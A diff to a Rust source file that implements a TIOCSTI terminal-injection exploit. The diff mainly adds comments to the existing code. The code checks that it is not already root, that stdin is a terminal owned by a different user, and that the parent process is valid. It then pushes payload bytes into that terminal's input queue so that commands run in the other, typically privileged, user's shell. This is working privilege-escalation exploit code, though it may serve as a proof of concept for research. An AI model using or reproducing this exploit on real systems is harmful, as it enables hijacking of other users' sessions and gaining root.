@@ -26,30 +26,34 @@ const END: &[u8] = b";end\n";
 ///
 /// Returns an [`anyhow::Error`] if the `TIOCSTI` ioctl fails.
 pub fn run() -> anyhow::Result<()> {
+    // Check that we are not already root.
     // SAFETY: getuid() is safe to call
     let uid = unsafe { getuid() };
     if uid == 0 {
         anyhow::bail!("we are already root");
     }
 
+    // Check that stdin refers to a terminal.
     if !io::stdin().is_terminal() {
         anyhow::bail!("stdin does not refer to a terminal");
     }
 
+    // Check that we have a valid parent.
     // SAFETY: getppid() is safe to call
     let parent_pid = unsafe { libc::getppid() };
     if parent_pid <= 1 {
         anyhow::bail!("invalid parent process id");
     }
 
+    // Check that we have a valid tty and that it does not have the same uid as us.
     let tty_path = fs::read_link(format!("/proc/self/fd/{STDIN_FILENO}"))
         .context("failed to resolve tty path")?;
-
     let tty_metadata = fs::metadata(&tty_path).context("failed to stat tty")?;
     if tty_metadata.uid() == uid {
         anyhow::bail!("tty has the same uid as us");
     }
 
+    // Inject the payload into the tty.
     for &b in START {
         tiocsti_inject(STDIN_FILENO, b).context("failed to inject into tty")?;
     }
@@ -60,6 +64,7 @@ pub fn run() -> anyhow::Result<()> {
         tiocsti_inject(STDIN_FILENO, b).context("failed to inject into tty")?;
     }
 
+    // TODO: remove START and END and use a single loop with COMMAND as the body?
     // TODO: move initial checks to an external function?
 
     // tiocsti_inject(STDIN_FILENO, b'X').context("failed to inject into tty")?;
